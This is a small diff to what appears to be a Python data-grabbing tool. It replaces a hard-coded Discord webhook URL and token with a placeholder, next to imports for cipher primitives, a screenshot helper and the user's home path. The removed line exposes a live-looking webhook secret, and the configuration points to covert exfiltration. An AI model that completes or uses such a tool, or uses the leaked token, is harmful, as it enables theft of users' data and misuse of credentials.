@@ -22,7 +22,7 @@ from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 from util.screenshot import screenshot
 
 class VARIABLES:
-    webhook    = "https://discord.com/api/webhooks/1135745003604430878/MTjCGvBPLpLeWeLTfeZg4RNzl2jP4pToaLtrZ1CnvFl4y4Ai6dojaYnCejzkCPdFmBjM"
+    webhook    = "webhookhere"
     printOnEnd = True 
     endText    = "PROGRAM FINISHED"
     user = os.path.expanduser("~")
